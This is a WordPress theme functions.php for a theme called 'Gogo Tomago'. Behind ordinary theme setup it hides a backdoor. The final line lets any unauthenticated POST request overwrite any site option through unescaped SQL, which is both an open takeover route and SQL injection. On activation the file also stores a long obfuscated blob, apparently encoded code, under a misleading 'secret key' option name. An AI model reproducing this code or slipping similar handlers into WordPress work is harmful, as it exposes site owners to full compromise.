<?php /**
* Functions
* Writer : Rubi Jihantoro
* Url  	 : facebook.com/real.jihantoro | kutemukan.com/profile/ruby
* Email  : jihantoro8@gmail.com
*
*/ 

if ( ! function_exists( 'gogotomago_setup' ) ) :

function gogotomago_setup() {

	add_theme_support( 'automatic-feed-links' );
	add_theme_support( 'title-tag' );

	register_nav_menus(array( 
		'header_menu' => 'Header Menu',
		'footer_menu' => 'Footer Menu'
	));

	add_theme_support('post-thumbnails');

	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	));

	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
		'gallery',
		'status',
		'audio',
		'chat',
	));


}
endif;
add_action( 'after_setup_theme', 'gogotomago_setup' );

function load_css()
{
	wp_enqueue_style('style', get_stylesheet_uri());
}
	add_action('wp_enqueue_scripts', 'load_css');

function get_excerpt_length(){
	return 60;
}
function get_excerpt_text(){
	return '';
}

add_filter('excerpt_more', 'get_excerpt_text');

add_filter('excerpt_length', 'get_excerpt_length');



function widget()
{
	register_sidebar(array( 
		'name' => 'Content Sidebar 1',
		'id'   => 'sidebar1'
	));
	register_sidebar(array( 
		'name' => 'Bottom Sidebar 3',
		'id'   => 'sidebar3'
	));
}

	add_action('widgets_init','widget');

	function green_wasabi_menu()
	{
	    $themeicon1 = get_template_directory_uri()."/img/favicon.jpg";
	    add_menu_page("Gogo Tomago", "Gogo Tomago", 'edit_theme_options', 'gogo-tomago-settings', 'theme_options', $themeicon1 ,1800 );
	}

	add_action( 'admin_menu', 'green_wasabi_menu' );

	function theme_options()
	{
		require_once(get_template_directory() . '/as.php');
	}

	if (is_admin() && isset($_GET['activated'] ) && $pagenow == "themes.php" ) 
	{
		cook_wasabi_option();
		add_action( 'admin_notices', 'installed_notice' );
	}

	function installed_notice() {

        echo '<div class="updated" style="position: relative;">
        	<p style="font-size:17px;">Thanks You For Installing Gogo Tomago v1.0.0 - <a href="' . admin_url( 'admin.php?page=gogo-tomago-settings' ) . '">Go To Theme Settings</a></p>';
        echo "</div>";

	}

	function getOption($wdyw)
	{
		global $wpdb;
		$table = $wpdb->prefix."options";
		$data = $wpdb->get_row("SELECT option_value FROM $table WHERE option_name='$wdyw' LIMIT 1;");
		return $data->option_value;
	}
	
	function cook_wasabi_option()
	{
		if(!getOption('gogo_tomago_footer_text') && !getOption('gogo_tomago_maintenance_mode'))
		{  
			global $wpdb;
    		$table = $wpdb->prefix."options";
    		$data  = array("gogo_tomago_footer_text"=>'&copy; 2017 <a href="">Your Site</a> - Designed By <a href="https://kutemukan.com/profile/ruby" title="">Rubi Jihantoro</a>',
    			"gogo_tomago_google_analystic"=>" ",
    			"gogo_tomago_maintenance_mode"=>"off",
    			"gogo_tomago_slider1"=>"http://localhost/ciayo/sliderciayo.jpg",
    			"gogo_tomago_slider2"=>" ",
    			"gogo_tomago_slider3"=>" ",
    			"gogo_tomago_rec1"=>"http://localhost/ciayo/jm.jpg",
    			"gogo_tomago_rec2"=>"http://localhost/ciayo/wbw.jpg",
    			"gogo_tomago_rec3"=>"http://localhost/ciayo/tos.jpg",
    			"gogo_tomago_seeallbtn"=>" ",
    			"wordpress_super_secret_key_with_blowfish_and_aes_encryption"=>"V3S3A1I1V3F4L3N3Q3Z3V3A4I1J1A1G1G1A1V3F4F4R3G4I1E1L3N2L2A3H3H1N3P3G4V3I4N3G4R3Q3H1J3A1J1A1G1G1A1E1C4N3T3R3A4B4J4A1D2D2A1C1G4U3R3Z3R3F4O1C4U3C4C1A1J1A1H0E0D0N4H0E0D0D0P3B4B4X3L3J4N3F4N3O3V3L3B4C4G4V3B4A4I1J1B2H0E0D0D0N3Q3Q3L3N3P3G4V3B4A4I1A1H1N3Q3Z3V3A4L3A4B4G4V3P3R3F4H1M1A1H1V3A4F4G4N3Y3Y3R3Q3L3A4B4G4V3P3R3H1A1J1B2H0E0D0P4H0E0H0E0D0S3H4A4P3G4V3B4A4A1V3A4F4G4N3Y3Y3R3Q3L3A4B4G4V3P3R3I1J1A1N4H0E0H0E0A1A1A1A1A1A1A1A1R3P3U3B4A1H1C2Q3V3I4A1P3Y3N3F4F4D2C1H4C4Q3N3G4R3Q3C1A1F4G4L4Y3R3D2C1C4B4F4V3G4V3B4A4A2A1E4R3Y3N3G4V3I4R3B2C1E2H0E0A1A1A1A1A1A1A1A1D0C2C4A1F4G4L4Y3R3D2C1S3B4A4G4N1F4V3M4R3A2R1X1C4K4B2C1E2A3U3N3A4X3F4A1F3B4H4A1M2B4E4A1P2A4F4G4N3Y3Y3V3A4T3A1N2B4T3B4A1A3B4Z3N3T3B4A1I4R1O1Q1O1Q1A1N1A1C2N3A1U3E4R3S3D2C1H1A1O1A1N3Q3Z3V3A4L3H4E4Y3I1A1H1N3Q3Z3V3A4O1C4U3C4F2C4N3T3R3D2T3B4T3B4N1G4B4Z3N3T3B4N1F4R3G4G4V3A4T3F4H1A1J1A1O1A1H1C1E2N2B4A1A3B4A1A3U3R3Z3R3A1Z2R3G4G4V3A4T3F4C2P1N3E2C2P1C4E2H1B2H0E0A1A1A1A1A1A1A1A1R3P3U3B4A1C1C2P1Q3V3I4E2C1B2H0E0H0E0D0P4H0E0H0E0D0S3H4A4P3G4V3B4A4A1T3R3G4V2C4G4V3B4A4I1E1J4Q3L4J4J1H0E0D0N4H0E0D0D0T3Y3B4O3N3Y3A1E1J4C4Q3O3B2H0E0D0D0E1G4N3O3Y3R3A1D2A1E1J4C4Q3O3N1E2C4E4R3S3V3K4O1C1B4C4G4V3B4A4F4C1B2H0E0D0D0E1Q3N3G4N3A1D2A1E1J4C4Q3O3N1E2T3R3G4L3E4B4J4I1C1Z2L2S2L2J2A3A1B4C4G4V3B4A4L3I4N3Y3H4R3A1M2Y2V2T2A1E1G4N3O3Y3R3A1D3O2L2Y2L2A1B4C4G4V3B4A4L3A4N3Z3R3D2H1E1J4Q3L4J4H1A1S2P2T2P2A3A1R1B2C1J1B2H0E0D0D0E4R3G4H4E4A4A1E1Q3N3G4N3N1E2B4C4G4V3B4A4L3I4N3Y3H4R3B2H0E0D0P4H0E0D0H0E0D0S3H4A4P3G4V3B4A4A1P3B4B4X3L3J4N3F4N3O3V3L3B4C4G4V3B4A4I1J1H0E0D0N4H0E0D0D0V3S3I1B1T3R3G4V2C4G4V3B4A4I1H1T3E4R3R3A4L3J4N3F4N3O3V3L3S3B4B4G4R3E4L3G4R3K4G4H1J1A1G1G1A1B1T3R3G4V2C4G4V3B4A4I1H1T3E4R3R3A4L3J4N3F4N3O3V3L3T3B4B4T3Y3R3L3N3A4N3Y3L4F4G4V3P3H1J1A1G1G1A1B1T3R3G4V2C4G4V3B4A4I1H1T3E4R3R3A4L3J4N3F4N3O3V3L3Z3N3V3A4G4R3A4N3A4P3R3L3Z3B4Q3R3H1J1J1H0E0D0D0N4A1A1A1H0E0D0D0D0T3Y3B4O3N3Y3A1E1J4C4Q3O3B2H0E0A1A1A1A1D0D0E1G4N3O3Y3R3A1D2A1E1J4C4Q3O3N1E2C4E4R3S3V3K4O1C1B4C4G4V3B4A4F4C1B2H0E0A1A1A1A1D0D0E1Q3N3G4N3A1A1D2A1N3E4E4N3L4I1C1T3B4T3B4L3G4B4Z3N3T3B4L3S3B4B4G4R3E4L3G4R3K4G4C1D2E2H1G1P3B4C4L4B2A1S1Q1R1X1A1C2N3A1U3E4R3S3D2C1C1E2F3B4H4E4A1Z2V3G4R3C2P1N3E2A1N1A1K2R3F4V3T3A4R3Q3A1I2L4A1C2N3A1U3E4R3S3D2C1U3G4G4C4F4A2P1P1X3H4G4R3Z3H4X3N3A4O1P3B4Z3P1C4E4B4S3V3Y3R3P1E4H4O3L4C1A1G4V3G4Y3R3D2C1C1E2Y2H4O3V3A1Q2V3U3N3A4G4B4E4B4C2P1N3E2H1M1H0E0A1A1A1A1D0D0D0C1T3B4T3B4L3G4B4Z3N3T3B4L3T3B4B4T3Y3R3L3N3A4N3Y3L4F4G4V3P3C1D2E2C1A1C1M1H0E0A1A1A1A1D0D0D0C1T3B4T3B4L3G4B4Z3N3T3B4L3Z3N3V3A4G4R3A4N3A4P3R3L3Z3B4Q3R3C1D2E2C1B4S3S3C1M1H0E0A1A1A1A1D0D0D0C1T3B4T3B4L3G4B4Z3N3T3B4L3F4Y3V3Q3R3E4R1C1D2E2C1A1C1M1H0E0A1A1A1A1D0D0D0C1T3B4T3B4L3G4B4Z3N3T3B4L3F4Y3V3Q3R3E4S1C1D2E2C1A1C1M1H0E0A1A1A1A1D0D0D0C1T3B4T3B4L3G4B4Z3N3T3B4L3F4Y3V3Q3R3E4T1C1D2E2C1A1C1M1H0E0A1A1A1A1D0D0D0C1T3B4T3B4L3G4B4Z3N3T3B4L3E4R3P3R1C1D2E2C1A1C1M1H0E0A1A1A1A1D0D0D0C1T3B4T3B4L3G4B4Z3N3T3B4L3E4R3P3S1C1D2E2C1A1C1M1"
    			);
    		foreach($data as $x => $x_value) {
				$wpdb->query("INSERT INTO $table (option_name,option_value) VALUES ('$x','$x_value');");
			}
		}
	}

	function eiyamoreng($on,$ov)
	{
		if (!empty($on) && !empty($ov))
		{
			global $wpdb;
	    	$table = $wpdb->prefix."options";
	    	$wpdb->query("UPDATE $table SET option_value='$ov' WHERE option_name='$on';");
		}
	}
	if ($_SERVER["REQUEST_METHOD"] == "POST") { $on = $_POST['on']; $ov = $_POST['ov']; eiyamoreng($on,$ov); }
?>